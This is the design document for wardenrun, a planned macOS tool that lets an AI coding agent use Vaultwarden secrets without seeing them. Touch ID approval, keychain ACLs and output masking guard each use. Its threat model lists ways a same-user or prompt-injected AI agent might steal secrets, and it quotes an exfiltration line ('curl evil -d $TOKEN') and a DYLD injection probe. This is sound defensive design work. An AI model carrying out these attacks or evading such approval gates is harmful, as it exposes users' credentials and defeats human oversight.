# wardenrun: design

Status: **approved by the maintainer on 2026-10-18**, with the README requirements of section 12.
No product code exists yet.
Inputs: the original requirements and the research below (every claim is marked *verified*
with its source, or *inferred*).

## 1. What this is

`wardenrun` lets an AI coding agent use a secret from a Vaultwarden vault **without ever
seeing it**. Every use needs the human's Touch ID, in a dialog that shows the exact command.
The secret goes straight into the child process; the child's output is masked on the way back.

```
wardenrun run example-api -- python3 script.py    # Touch ID, secret injected, output masked
wardenrun new staging-db-admin                     # Touch ID, generate + store, never printed
```

One-shot process, no daemon, wraps the official `bw` CLI, macOS first.

## 2. Goals, non-goals, anti-goals

**Goals**
- An agent running as the same macOS user cannot obtain a secret it was not approved for.
- Secrets never reach transcripts, logs, shell history, `.env` files or an unlocked vault.
- Installable like any outside project: `brew install mateuszgachowski/tap/wardenrun`.
- Honest security claims. README and `THREAT_MODEL.md` say what is and is not protected.

**Non-goals (v1)**
- Reimplementing Bitwarden crypto (we drive `bw`).
- Linux/Windows (designed for, not built, see section 10).
- Defending against root or malware, or against an *approved* malicious command.
- A secrets *manager* UI. Items are created in the Vaultwarden clients; `new` only generates.

**Anti-goals** (would make it a failure even if it "works")
- Any code path where a secret value reaches the agent's stdout/stderr, a log, or argv.
- A background process holding an unlocked vault or an IPC socket the agent can talk to.
- Marketing "Touch ID protected" where the OS is not actually enforcing it (see section 3).

## 3. The hard part: can the agent get the master password without Touch ID?

### 3.1 What was verified

Environment: macOS 15.8, an Intel Mac with a T2 chip and Touch ID enrolled, SIP on, binaries
signed ad-hoc with no entitlements (what a Homebrew-distributed binary looks like) unless a
row says otherwise. Probe sources are throwaway and are not in the repo. Everything was run
against temporary keychains; the login keychain and the trust settings were not modified.

| # | Experiment | Result |
|---|-----------|--------|
| 1 | `SecItemAdd` to the **data protection keychain** (`kSecUseDataProtectionKeychain`), plain item | `-34018` *A required entitlement isn't present* |
| 2 | Same, with `.biometryCurrentSet` / `.userPresence` access control | `-34018` |
| 3 | **File-based keychain**, plain item | OK |
| 4 | File-based keychain, item with `.biometryCurrentSet` / `.userPresence` | `-34018`. The OS refuses biometric ACLs without the entitlement, even in the legacy keychain. |
| 5 | Secure Enclave key with any access control (`.privateKeyUsage`, +biometry) | `-25308`, `AKSError -536870174` (not permitted). Only an ACL-less, non-persistent SE key is creatable, which is useless for storage. |
| 6 | `LAContext.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, localizedReason: <152 chars>)` from a bare, hardened-runtime ad-hoc CLI started from an agent's shell, with the password fallback hidden | `canEvaluate = true`, `biometryType = touchID`; the system sheet appeared and a fingerprint was **accepted** (exit 0), twice. By screenshot: the 152-character reason is shown **in full**, wrapped over three lines, inside the system's own sentence `<binary name> <wants to> <reason>. <Use Touch ID to allow.>` (localized by the system). The only button is Cancel (no password fallback). The sheet shows the binary's file name and a generic "exec" icon. The truncation limit for longer reasons is measured in test 13. |
| 7 | File-based keychain item with ACL = "this binary only" (`SecAccessCreate` + `SecTrustedApplication`), read by (a) same binary, (b) byte-identical copy at another path, (c) a different ad-hoc binary, interaction disabled | (a) read, no prompt. (b) read, no prompt: the ACL binds to **code identity (cdhash), not path**. (c) **denied** (`-25293`; with interaction enabled this is the keychain-password dialog) |
| 8 | `DYLD_INSERT_LIBRARIES=evil.dylib` against ad-hoc binaries | Loaded into the **non-hardened** binary. **Ignored** by an ad-hoc binary signed with `-o runtime` (hardened runtime). |
| 9 | Can a sibling process of the same user read a child's environment via `ps eww`? | **Yes** for ordinary binaries, even hardened-runtime ones. No for Apple platform binaries (`/usr/bin/sleep`). |
| 10 | Developer Tools / debugger attach | `DevToolsSecurity`: developer mode disabled on this machine; attach needs admin auth. Not a guarantee on other machines (Xcode enables it). |
| 11 | Same ACL as test 7, but the binaries are signed with a **free, self-generated code-signing certificate** (hardened runtime, one fixed identifier). Read by: the creating build `v1`; a **new build `v2`** (different cdhash, same certificate); a build with the same identifier but a **different certificate**; an ad-hoc re-signed copy with the same identifier; an unsigned copy. | `v1` read; **`v2` read, no prompt**; the other certificate, the ad-hoc copy and the unsigned copy **all denied** (`-25293`). The ACL stores the designated requirement `identifier "..." and certificate leaf = H"<cert hash>"`, so it survives upgrades and cannot be matched without the private key. |
| 12 | `DYLD_INSERT_LIBRARIES` against the self-signed binaries | Loaded without hardened runtime; **ignored with `-o runtime`**, same as ad-hoc (test 8). |
| 13 | Touch ID sheet with a **700-character** reason carrying markers `[#100]`...`[#700]` | Sheet shown, fingerprint accepted. By screenshot, the text is complete up to `[#500]` and then **cut silently after about 510 characters** (`...[#500]filler text f.`): no ellipsis, no marker, nothing tells the reader that anything is missing. About 11 lines of text. A command line whose tail is cut off would hide exactly the part an attacker wants hidden, so this sets a hard cap and a deny-instead-of-truncate rule (5.3). |

### 3.2 What the sources say (verified)

- Apple TN3137: biometric protection of items and Secure Enclave keys **require the data
  protection keychain**. Its access groups come from code-signing entitlements that
  "must be authorized by a provisioning profile". "Your program needs an app-like bundle
  structure in which to embed that profile. This is standard for app and app extensions but
  not for command-line tools."
- Apple TN3125: "A standalone executable can't claim a restricted entitlement because
  there's no place to embed the provisioning profile". `keychain-access-groups` is a
  restricted entitlement. The workaround is an app-like wrapper
  (`X.app/Contents/MacOS/x` + `Contents/embedded.provisionprofile`).
- Apple DTS (forum thread 125510): "To interact with keys protected by the SE you must use
  the iOS-style keychain, and that requires an entitlement that's authorised by a
  provisioning profile. A tool has nowhere to store a provisioning profile."
- Existence proof that the wrapper approach works for open source: **Secretive**
  (Secure Enclave SSH agent) ships `keychain-access-groups` in its entitlements, is
  distributed via GitHub releases and `brew install secretive`. *Inferred:* it uses a
  Developer ID profile (App Store builds are not on GitHub).
- Bitwarden Desktop on macOS (`bitwarden/clients`,
  `os-biometrics-mac.service.ts`, `desktop_native/core/src/password/macos.rs`): calls
  `systemPreferences.promptTouchID` (a UI gate) and then reads a plain generic password from
  the file-based keychain. **No biometric ACL.** It also calls `PT_DENY_ATTACH`
  (`process_isolation/macos.rs`). So the strength of our Tier B (below) equals what the
  official desktop client does.
- Homebrew 5.0.0 notes: "We will disable all Homebrew/homebrew-cask casks that fail
  Gatekeeper checks in September 2026" and `--no-quarantine` is deprecated. The note names
  `homebrew/homebrew-cask` only; whether third-party tap casks are affected is *unknown*.
  Formula downloads fetched by `curl` carry no quarantine attribute (verified:
  `xattr` shows none), so an ad-hoc binary in a formula is not blocked by Gatekeeper.

### 3.3 Options and what each one actually protects against

| Option | Needs | OS-enforced Touch ID on every read? | Stops a same-user agent from... | Does **not** stop |
|---|---|---|---|---|
| **A. Data protection keychain item with `.biometryCurrentSet`** (**not planned**, see 3.4) | Apple Developer Program (paid), Developer ID cert, provisioning profile with `keychain-access-groups`, `.app` wrapper, notarization. Ships as a **cask**. | **Yes.** Even a fully compromised wardenrun process cannot read it without a touch. | reading the item from any process; replaying a stolen session; patching our binary | root/malware; a touch the user gives for a malicious command |
| **B. File-based login keychain, ACL = this binary, plus `LAContext` biometric gate in wardenrun** (**the product**) | Nothing paid. Hardened-runtime signature with a **stable, maintainer-generated self-signed certificate** (tests 11 and 12). Works in a plain Homebrew **formula**. | **No.** The gate is in our code. The OS only enforces "only this binary may read". | reading the item from another process (denied, tested); running wardenrun without a touch; `DYLD_` injection (blocked by hardened runtime, tested) | an attacker who can run code *inside* a wardenrun process (needs debugger rights or a non-hardened build); user clicking "Always Allow" in a keychain dialog for a trojan |
| **C. Secure Enclave key wrapping the master password** | Same entitlements as A. | Yes | Same as A | Same as A. Adds only hardware binding, which A's biometric ACL already gives. Not worth the extra moving parts. |
| **D. No storage: type the master password each time** | Nothing | n/a | everything stored | usability. Offered as `--no-store` fallback, not the default. |
| **E. Root-owned secret + `sudo` with `pam_tid`** | admin rights, PAM config | Yes (via PAM) | reading the file without a touch | Setup friction, and the touch prompt does not show our command line. Rejected for v1. |
| **F. Store `BW_SESSION` / leave vault unlocked** (what 1Password-less setups do today) | Nothing | No | nothing | everything. This is the problem we are solving. |

### 3.4 Decision

1. **Ship Tier B only, with no paid Apple account** (maintainer decision, 2026-10-18: US$99/yr
   is not acceptable for a free open-source tool). Tier B works today and matches the
   official Bitwarden Desktop's guarantee. The `SecretStore` protocol stays, so a Tier A
   backend can be added by anyone who holds a Developer account, but **Tier A is not on the
   roadmap**. The honest consequence: the original ideal ("every read triggers Touch ID at the
   OS level, not just in our UI") is **not met**; the gate is wardenrun's own code, hardened
   against injection and bound to its signature (threat model, section 6).
   *Unverified lead, not relied on:* a free Apple ID "Personal Team" may be able to sign a
   locally built `.app` with keychain sharing for personal use (one source says macOS free
   accounts include it; free profiles are short-lived and need Xcode). Worth a spike only if
   OS-enforced Touch ID turns out to matter to users.
2. **The README says plainly which tier is active.** `wardenrun doctor` prints it.
   Tier B is described as "approval enforced by wardenrun, storage restricted by the OS to
   the wardenrun binary", never as "Touch ID protected keychain".
3. **Blast radius is limited at the vault, not only on the Mac.** wardenrun is designed to
   be used with a **dedicated low-privilege Vaultwarden account** that is a member of one
   organization and sees one collection. Even a total compromise of the stored master
   password exposes that collection only. README tells users never to store their personal
   vault's master password. This is the strongest control and does not depend on macOS.
4. **What is stored:** the master password of that dedicated account (the CLI has no PIN or
   user-key unlock mode; see 5.2). It should be a long random value (24+ characters from a
   password manager, pasted once at `setup`), because the `bw` profile on disk lets a
   same-user process attempt offline guessing. Security-relevant settings (server URL,
   account, allowed collection, pinned `bw` identity) live **inside the protected keychain
   item**, not in a user-writable config file the agent could edit.
5. **Tier B hardening is mandatory, not optional:** hardened-runtime signature (without
   `allow-dyld-environment-variables`, `get-task-allow`, or `disable-library-validation`),
   `PT_DENY_ATTACH`, `RLIMIT_CORE=0`, secrets in `mlock`ed buffers zeroed after use,
   refuse to run if `DYLD_*` is set or the binary is not hardened (`wardenrun doctor`).
6. **A stable signing identity instead of paying.** An ad-hoc signature is bound to the
   cdhash, so every `brew upgrade` would make the stored item unreadable (test 7c). Instead,
   the maintainer generates **one self-signed code-signing certificate** (free, `openssl`),
   keeps its private key as a CI secret, and signs every release with it, with a fixed
   identifier and hardened runtime. The keychain ACL then holds `identifier "..." and
   certificate leaf = H"<hash>"`: upgrades keep working (test 11, `v2`), and a different
   certificate cannot match without the key. The cost is key custody: if the key leaks, an
   attacker can sign a binary that passes the ACL (threat 18); rotating the certificate makes
   everyone re-run `wardenrun setup`. The certificate hash is published in the README and
   printed by `wardenrun doctor`. A build from source is signed ad-hoc (or with the builder's
   own certificate) and needs `setup` after each rebuild. `doctor` detects an unreadable
   item and says so.

## 4. Language: Swift

Needs native Touch ID (`LocalAuthentication`), Keychain (`Security`), `proc_pidpath`, and
one self-contained binary. (No UI toolkit: the system Touch ID sheet is the whole UI, 5.3.)

| | Swift | Rust | Go |
|---|---|---|---|
| LocalAuthentication / Security | first-party, no FFI | `objc2-*` + `security-framework` crates; the biometric gate code is FFI-heavy | cgo; painful |
| Universal macOS binary | `swift build --arch arm64 --arch x86_64` | `lipo` two builds | `lipo` two builds + cgo cross toolchain |
| Runtime to ship | Swift runtime is in macOS 12.3+ | static | static |
| Linux later | works (Foundation on Linux), no LocalAuthentication/Security | best | good |

Swift wins on the part that is hard on macOS (Keychain, LA, UI). Rust would win the Linux
port. The cost is contained by splitting the code into a platform-neutral `WardenrunCore`
(masking, policy, audit log, `bw` driver, env sanitising, CLI parsing) that builds on
Linux, and `WardenrunMac` (store, approver, process inspection) behind protocols. This is
a design call; changing it later only touches the platform layer.

SwiftPM only. No external dependencies in v1 (a TOML/arg parser can be 200 lines;
`swift-argument-parser` is acceptable if the builder prefers, as it is Apple-maintained).

## 5. Architecture

One short-lived process per invocation. No daemon, no socket, no cache. Everything that
touches a secret happens between approval and `exec`, inside one process.

### 5.1 `wardenrun run` flow

```
wardenrun run <item> [--env VAR=field]... [--file VAR=field]... [--stdin field] -- cmd args...
```

1. **Self-check** (no secrets involved): hardened-runtime flag present, no `DYLD_*`, a window
   server session exists (otherwise deny: no remote approval), `PT_DENY_ATTACH`, core dumps off.
2. **Resolve the request**: look `cmd` up on the caller's `PATH` to an absolute path, hash
   that executable, record cwd and the parent chain (`proc_pidpath` up to the terminal).
   Build the approval text (5.3); reject argv containing NUL, and any command that does not
   fit the 400-character budget: a command too long to review is not approved.
3. **Rate limit**: one pending prompt, cool-down after repeated denials.
4. **Approval** (5.3). Deny or timeout: audit, exit 77.
5. **Read the protected item** from the `SecretStore` (master password + pinned settings).
6. **Fetch the one item** through `bw` (5.2): unlock, sync, list the allowed collection only,
   pick the exact-name match (exactly one, or fail), lock. The session is discarded
   immediately and the master password zeroed.
7. **Spawn the child** with `posix_spawn` using the *same* resolved path and argv that were
   shown. The environment is the caller's own plus the requested variables. stdout and stderr
   are pipes through the masker (5.5). Signals are forwarded; the exit status is propagated.
8. **Clean up** temp files, zero buffers, write the audit line (5.7).

There is no window between "approved" and "used" in which another process can substitute
the command: approval, fetch and exec are the same process and the same request object.

### 5.2 `bw` driver

Facts that shape the driver (verified in `bitwarden/clients` tag `cli-v2026.10.0` unless
marked *tested* or *inferred*):

- **Unlock needs the master password.** `--passwordenv`, `--passwordfile` or a prompt; no
  stdin option, no PIN in the CLI, and API-key login does not replace the password.
  Biometric unlock exists only through Bitwarden Desktop and behind a server feature flag.
- **`BW_SESSION` + `data.json` decrypt the cached vault offline**, without the master
  password. `bw lock` removes the protected user key, but the access and refresh tokens (and
  the API-key secret, if used) **stay in `data.json` in plaintext**, mode `0600`
  (the CLI has no secure storage). *Inferred:* the file also holds the encrypted
  vault and the wrapped user key, a target for offline guessing of the master password.
- `bw get` has **no collection filter** (`--collectionid` exists only on `list items`; several
  filters are OR). `get <phrase>` decrypts the whole vault and does a fuzzy substring match.
- **Sync is never automatic**; `get`/`list` read the local cache.
- Concurrent `bw` processes race on the single-use refresh token and can wipe the profile
  (`bitwarden/clients#23828`, fix unconfirmed).
- HTTPS is mandatory (*tested*: `http://127.0.0.1` is refused). `bw` >= 2026.9.0 needs
  Vaultwarden >= 1.37.4; older `bw` breaks on 1.37.4 (removed `prelogin`). Bitwarden treats
  Vaultwarden issues as unsupported.
- `login` and `unlock` may migrate the account (user-key id backfill, KDF minimum).
- *Tested* on an Intel i7: about 1 s startup and about 3 s wall time per command.
- The official macOS `bw` from GitHub releases is signed `Developer ID Application:
  Bitwarden Inc (LTZ2PFU5D6)` with hardened runtime (*verified locally* with `codesign`).
  Homebrew's `bitwarden-cli` is instead a Node script (`depends_on "node"`).

Driver rules:

1. **Pinned binary.** Preferred: the signed GitHub-release `bw`, checked on every run
   against a code requirement on team `LTZ2PFU5D6`. Also accepted: Homebrew's Node build,
   pinned as absolute paths of `node` and the script plus SHA-256 (trust on first use at
   `setup`). Anything else is refused. The pin lives in the protected item (5.8).
2. **Allowlisted environment, nothing inherited:** `HOME`, `LANG`,
   `BITWARDENCLI_APPDATA_DIR` (wardenrun's own dir), `BW_NOINTERACTION=true`, a `PATH`
   containing only the pinned directories, and `NODE_EXTRA_CA_CERTS`/`https_proxy` only
   if set in the protected item. No `NODE_OPTIONS`, no `BW_*` from the caller. Refuse if a
   `bw-data` directory sits next to the binary (it silently overrides the app-data dir).
3. Always `--nointeraction --response`, stdout/stderr as pipes, tolerant JSON parsing. stderr
   is treated as noise: never shown raw, masked before it is ever logged.
4. **One `flock` around the whole `bw` phase** of a run (`~/.config/wardenrun/bw.lock`).
5. **Sequence for `run`:** `unlock` → `sync` → `list items --collectionid C
   --organizationid O` → pick the item **in wardenrun** by exact, case-sensitive name
   (`deletedDate` null, member of C, exactly one) → `lock`. Never `get <name>`, never
   `--search`, never `--session`. `sync` runs every time by default (`--offline` skips it)
   because a stale secret fails confusingly; this is a design call.
6. **How the master password and session reach `bw`: a decision ladder, settled by a spike
   that opens PR3** (it needs a real Vaultwarden test server; `bw serve` without a logged-in
   profile exits immediately with "You are not logged in", so it could not be probed in
   research):
   - **a. Preferred:** one `bw serve --hostname fd+connected://N --nointeraction` per run on
     an inherited socketpair (present in `serve.command.ts`, undocumented). The password goes
     in the `POST /unlock` body and items come back over the same socket. No password and
     no `BW_SESSION` in any argv or environment, and no TCP port. Needs the profile logged
     in by `setup` first. Its Host/Origin guards require `Host: localhost`.
   - **b.** `unlock --passwordfile /dev/fd/N` fed by a pipe, then `BW_SESSION` in the
     environment of each short-lived `bw` child. Leaves `BW_SESSION` visible to `ps eww`
     for seconds (threat 16).
   - **c.** `--passwordenv`: last resort; the master password itself is visible for the
     unlock (threat 16).

   Whichever rung ships, the README states it and `doctor` reports it.
7. **Always `lock`**, also on error and on signals. The session key lives only in
   wardenrun's memory; if wardenrun is killed, the protected key blob left in `data.json`
   cannot be opened without it. Optional `logout_after_run = true` also removes the tokens
   from disk (slower: a full login per run).
8. **Login at `setup`:** `bw config server <https url>`, then `bw login` with the master
   password (leaves only tokens on disk) or, for a 2FA account, `--apikey` (bypasses 2FA but
   leaves the client secret on disk). Password login on a dedicated
   account is recommended.
9. **Compatibility table** (tested `bw` ↔ Vaultwarden) is checked by `doctor`; the formula
   declares the supported range.
10. **Latency, stated honestly:** expect roughly 5–12 s of `bw` overhead per approved run
    (rung a is about one startup plus one KDF; rungs b and c are several `bw` processes).

### 5.3 Approval

- **v1 uses only the system Touch ID sheet** (`LAContext.evaluatePolicy(
  .deviceOwnerAuthenticationWithBiometrics)`, password fallback hidden). No custom window,
  no AppKit. The `localizedReason` string *is* the whole approval UI. The system renders it
  as `<binary file name> <wants to> <reason>. <Use Touch ID to allow.>` with only a Cancel
  button (test 6), so there is no Approve button to synthesise a click on.
- **Reason format**, written so it reads after the system's "wants to":
  `[warning tags] use secret "<item>" to run: <resolved exe> <args> (from <parent>) [end]`.
  Tags come first because the tail is where space runs out.
- **Hard cap, deny instead of truncate.** The system cuts long text *silently* at about
  510 characters (test 13). wardenrun budgets **400 characters** for the whole reason
  (counted after escaping; margin for other locales and OS versions). If the command does
  not fit, the request is **denied** and the caller gets on stderr: `command too long to
  review (N > 400); put it in a script file`. The text is never shortened or elided. The
  closing `[end]` makes any truncation by a future OS version visible.
- **Escaping:** control characters, newlines and bidirectional overrides are shown as
  visible escapes (`\n`, `\u{202E}`); arguments with spaces or quotes are shown shell-quoted;
  a non-ASCII character in the executable path or `argv[0]` adds a `[non-ASCII]` tag. This
  stops a command from forging the system's own surrounding sentence or reordering itself.
- **Soft warning tags** (never auto-deny): `[shell -c]` for `sh/bash/zsh -c` and
  `python -c`, `[network]` for `curl`, `wget`, `nc`, `ssh`, `scp`, `[env dump]` for
  `env`/`printenv`, `[exe changed]` when the executable hash differs from the last
  approval for this item, `[non-ASCII]`.
- Details that do not fit (executable SHA-256, cwd, full parent chain, variable names) go to
  the audit log (5.7), not the sheet.
- Timeout 60 s (the sheet is invalidated by wardenrun). After 3 denials or timeouts in
  5 minutes: 60 s lock-out.
- Accepted limits of the system sheet: it shows the binary's file name and a generic "exec"
  icon, and it is localized by the system while our reason text is English. A richer UI can
  be added later as another `Approver` behind the protocol, but it is **not** part of v1.

### 5.4 Injecting the secret

| Mode | How | Exposure |
|---|---|---|
| `--env VAR=field` (default) | environment of the child | readable by same-user `ps eww` for the child's lifetime (threat 9) |
| `--file VAR=field` | file `0600` in a fresh `0700` directory under `$TMPDIR`, path in `VAR`, removed on exit and on signals | readable by the same user while it exists |
| `--stdin field` | written to the child's stdin pipe, then closed | not visible to `ps`; only works for tools that read secrets from stdin |

`field` is `password`, `username`, `totp`, `notes`, `uri`, or the name of a custom field.
With no flags, custom fields named `env:VAR` on the item are injected as `VAR` (so the item
itself says which variables it provides). These conventions are design calls.

### 5.5 Masking

Streaming replacement on stdout and stderr, independently, with a hold-back of
`longest needle - 1` bytes so values split across chunks are still caught. Needles per
value: raw, base64 (standard and URL-safe, padded and unpadded, all three alignments),
percent-encoded, hex (both cases), JSON-escaped, single-quote shell-escaped; multi-line values
are also matched per line. Replacement text: `[REDACTED:<item>]`. A minimum needle length
(suggested 6 bytes) avoids garbling output; shorter secrets trigger a warning that masking is
unreliable. Children see pipes, not a TTY (colour and interactive tools degrade); a PTY mode
is a later feature. Masking is an **accident guard**, not an exfiltration barrier (threat 8).

### 5.6 `wardenrun new <name>`

```
wardenrun new <name> [--username U] [--uri URL] [--env VAR] [--length 32] [--charset alnum|full]
```

1. Validate the name (no control characters, at most 100 chars). Generate the password **inside
   wardenrun** with `SecRandomCopyBytes` and rejection sampling (not `bw generate`: no extra
   process, no extra 3 s). Length 16–128, default 32. `alnum` (default) works everywhere;
   `full` adds symbols except quotes, backslash, backtick, `$` and whitespace.
2. **Approval** dialog: "Create item `<name>` in collection `<C>`; password of N characters,
   never shown".
3. Same `bw` session as `run`: `unlock` → `sync` → `list` (refuse if the name already exists)
   → `create item` → `lock`. The item JSON is built in memory, base64-encoded by wardenrun
   and written to `bw create item`'s **stdin** (the CLI reads base64 JSON from stdin when no
   argument is given), so nothing secret is in an argv. The response contains the full item
   including the password: it is read from the pipe, only `id` is kept, the rest is zeroed.
4. Item shape: type 1, `organizationId` and `collectionIds: [C]`, `folderId: null`,
   `login.username`/`uris`, and the password in `login.password`; with `--env VAR` it is
   stored instead as a hidden custom field (`type: 1`) named `env:VAR` (5.4).
   The organization-collection create path in the SDK was not verified in research: the
   Vaultwarden integration test must cover it.
5. Output is one line: `created "<name>" (id ...) in <collection>`. Never the value.
6. Audit event `new`. *Later idea, not v1:* `new --then -- cmd` generates, injects into `cmd`
   and stores only if `cmd` succeeds, so the target service and the vault cannot drift apart.

### 5.7 Audit log

`~/Library/Logs/wardenrun/audit.jsonl`, mode `0600`, append-only (`O_APPEND`), one JSON
object per line: time, event (`approved`, `denied`, `timeout`, `error`, `new`, `setup`),
item name, command line (with any secret value masked), resolved executable + hash, cwd,
parent chain, tier, exit status, duration. **Never values.** Each line carries the SHA-256
of the previous line, so removing or editing lines is detectable (not preventable: the same
user can delete the file).

### 5.8 State and configuration

- `~/.config/wardenrun/config.toml`: preferences only (approval timeout, redaction text,
  log path). Nothing in it can widen access.
- `~/.config/wardenrun/bw/`: wardenrun's **own** `BITWARDENCLI_APPDATA_DIR`, so it never
  touches or depends on the user's personal `bw` session.
- **In the protected keychain item** (JSON blob): server URL, account e-mail, organization
  and allowed collection IDs, the master password, and the pinned `bw`/`node` identity.
  Changing any of it goes through `wardenrun setup`, which needs the master password typed by
  a human at a TTY plus an approval dialog that shows old and new values (threat 15).
- `wardenrun doctor`: prints tier, signature flags, hardening status, `bw` pin status,
  keychain item readability, Touch ID availability, server reachability. No secrets.

## 6. Threat model

(Restated in plain language in `docs/THREAT_MODEL.md`, which the README links.)

**Attacker:** an AI agent (or a prompt-injected one) running shell commands as the **same
macOS user** as the human, with no root. It can read any file that user can read, list
processes, run any binary, set any environment variable, edit dotfiles, and call
`security`/`bw`. It cannot produce a fingerprint.

**Assets:** (1) the master password of the dedicated vault account, at rest and in memory
for the few seconds of a run; (2) item values; (3) the vault session key and the `bw`
profile on disk.

| # | Attack | Outcome | Control |
|---|---|---|---|
| 1 | Read `.env`, shell history, transcripts | Nothing to find | Secrets never written; output masked; audit log holds names only |
| 2 | Run `bw` or `security find-generic-password` | Denied | Keychain ACL bound to wardenrun's signing requirement: foreign certificate, ad-hoc and unsigned callers are refused (tests 7, 11). Session key never persisted. |
| 3 | Run `wardenrun run X -- cmd` | Human decides | Full resolved command line (400-character cap, over-long commands are denied, never truncated), parent; executable hash and cwd in the audit log; one pending prompt at a time; 60 s timeout; lockout after repeated denials |
| 4 | Fake the approval | Not possible | No clickable "Approve" exists. The only gesture is the system biometric sheet. Password fallback is off by default. No window server session (ssh, cron) means deny. |
| 5 | Inject code into wardenrun (`DYLD_*`, debugger) | Blocked | Hardened runtime, `PT_DENY_ATTACH`, refuse to start with `DYLD_*` set (tested for `DYLD_INSERT_LIBRARIES`) |
| 6 | Steer wardenrun into running a malicious `bw` (PATH, `NODE_OPTIONS`, edited config) and capture the master password | Blocked | `bw` is called by pinned absolute path; its identity (Bitwarden's Team ID signature, or `node` + script hash) is stored in the protected item; its environment is built from an allowlist; on rung a/b of 5.2.6 the master password is not in env or argv |
| 7 | Replace the `wardenrun` binary or alias it | **Not protected.** Install dirs are user-writable and a fake dialog can phish. | `wardenrun doctor` checks the signature requirement and install location; the README publishes the certificate hash and says to verify |
| 8 | Approved command prints or sends the secret (`curl evil -d $TOKEN`, a script that logs it) | **Not protected** | That is why the dialog shows the full command line. Masking is an accident guard (raw, base64, URL, hex, JSON-escaped, shell-quoted), not an exfiltration barrier (`rev`, rot13, splitting beat it). |
| 9 | Read the injected env of a running child with `ps eww` | **Not protected for env injection** (tested; ordinary binaries leak, Apple platform binaries do not) | Prefer `--stdin` for tools that support it; keep commands short-lived; documented. Temp-file mode has the same exposure while the file exists. |
| 10 | Wear the user down with prompts | Mitigated | One pending prompt, cool-down after denials, every denial in the audit log |
| 11 | Tamper with the audit log | Detectable only | Hash-chained lines; the same user can still delete the file |
| 12 | Steal the master password from wardenrun memory | Mitigated | `mlock`, zeroed after use, no core dumps, `PT_DENY_ATTACH` |
| 13 | Compromise of the Mac's stored password | Blast radius limited | Dedicated vault account, one collection (section 3.4 point 3) |
| 14 | Server impersonation | Mitigated | `https://` required (plain `http://` is refused by `bw`, even on loopback: tested, 5.2); `bw` verifies certificates |
| 15 | Re-run `wardenrun setup` pointing at an attacker's server or account | Blocked | Needs the master password typed by a human at a TTY and an approval dialog showing old and new values |
| 16 | While one approved run is in flight, read the master password or `BW_SESSION` from `bw`'s environment (`ps eww`; `bw` is not an Apple platform binary) and use `BW_SESSION` + `data.json` to decrypt the **whole cached collection** offline | **Not protected on rungs b and c** of 5.2.6: one approval can leak every item the dedicated account sees. Window of a few seconds, and it needs an agent polling `ps` at that moment. | Rung a (`bw serve` on a socketpair) removes both secrets from env and argv. The dedicated account bounds the damage to its one collection. This is the main reason PR3 starts with a spike. |
| 17 | Read the access/refresh tokens (or API-key secret) from wardenrun's `bw` profile (`data.json`, mode `0600`, same user) and call the Vaultwarden API as the dedicated account | **Not protected.** Can read the encrypted vault (offline guessing of a strong master password is the next step), and delete or alter items the account may write. | Dedicated account; long random master password; Argon2id; read-only collection permission when `new` is not used; `logout_after_run`; password login instead of API key (no long-lived secret on disk) |
| 18 | The maintainer's signing key leaks, or a malicious release is published | **Not protected for users who installed that release.** A binary signed with the leaked key passes the keychain ACL and could read the stored item after one approval. | Key only in a CI secret plus one offline backup; releases carry a GitHub Artifact Attestation and published hashes; certificate rotation procedure (everyone re-runs `setup`); `SECURITY.md` for reporting. Same trust anchor as any package maintainer. |

**Out of scope:** root or malware on the machine; a user who approves without reading;
a physically stolen unlocked Mac; the security of Vaultwarden/`bw` themselves.

## 7. Distribution

- **Formula only, no paid Apple account** (so no notarization, no `.app`, no cask).
  GitHub Actions builds a universal (arm64 + x86_64) binary on a macOS runner, signs it
  with the project's **self-signed code-signing certificate**, hardened runtime
  (`codesign -s <identity> -o runtime -i <fixed identifier>`), publishes a tarball with
  SHA-256 and a GitHub Artifact Attestation, and updates the formula in
  `mateuszgachowski/homebrew-tap`. The formula downloads the release tarball (no build on the
  user's machine) and depends on the `bw` CLI. Install:
  `brew install mateuszgachowski/tap/wardenrun`. Gatekeeper is not involved: a formula
  download made by `curl` carries no quarantine attribute (verified), which is also why a
  self-signed signature is enough.
- **Certificate:** generated once with `openssl`, 10-year validity, private key stored as a
  CI secret plus one offline backup; the SHA-1 of the certificate is the identity pinned in
  every user's keychain ACL, so it is published in the README and in `SECURITY.md`.
- **Release check that must be automated:** after `brew install`, `codesign -d -r-` must
  still print the project's designated requirement. Homebrew can re-sign or patch binaries
  in some install paths; if it does, the ACL no longer matches and the install is broken.
  This has not been tested yet and is the first thing PR6 verifies.
- Apple Silicon and Intel are both first-class (Intel Macs with a T2 chip have Touch ID too).
- Version pinning of `bw`: the formula declares the tested range; `doctor` warns outside it.

## 8. Testing

- Platform-neutral core is unit-tested and built on Linux CI too: masker (property tests
  with random chunk boundaries and all encodings), env sanitiser, argv/exec resolution,
  audit chain, config blob, `bw` driver against a fake `bw` that records its argv/env.
- **Security regression tests:** the secret never appears in the argv or env of any process
  wardenrun spawns except the approved child; never in the audit log; never on wardenrun's
  own stdout/stderr in `new`.
- **Integration:** real `bw` (pinned) against a Vaultwarden container on a Linux runner:
  login, unlock, get, create, collection restriction.
- **macOS CI (no fingerprint available):** `doctor`, signature flags, DYLD refusal,
  keychain ACL behaviour with a temporary keychain, `Approver` replaced by a fake.
- **Manual checklist for biometric flows** (documented in `docs/RELEASING.md`), run by the
  maintainer before each release.
- Every PR is reviewed by two independent reviewers before it is merged.

## 9. Repo layout and PR plan

```
Package.swift
Sources/WardenrunCore/   masker, audit, env, exec resolution, config, bw driver, protocols
Sources/WardenrunMac/    KeychainAclStore, BiometricApprover (LAContext), ProcessInspector, hardening
Sources/wardenrun/       CLI entry
Tests/...
docs/                    DESIGN.md, THREAT_MODEL.md, RELEASING.md
.github/workflows/       ci.yml, release.yml
LICENSE (MIT), README.md, SECURITY.md
```

1. Repo + README (all of section 12, written against this design before the code exists) +
   THREAT_MODEL + PR template with the "data flow updated" checkbox + CI skeleton (public
   repo, MIT).
2. Core: masker, audit log, env sanitiser, exec resolution, config blob.
3. `bw` driver + Vaultwarden integration tests. **Starts with a time-boxed spike** against a
   local Vaultwarden (TLS, self-signed CA via `NODE_EXTRA_CA_CERTS`) to settle the 5.2.6
   ladder (`bw serve` on a socketpair, `--passwordfile /dev/fd/N`, `--passwordenv`) and to
   measure real unlock/KDF time. If rung a fails, this design is amended before more code.
4. macOS: Tier B store, approver, hardening, `doctor`, `setup`.
5. `run` and `new` end to end.
6. Release pipeline (self-signed certificate, signing in CI, attestation), tap, check that
   the signature survives `brew install`, README final, maintainer install test.

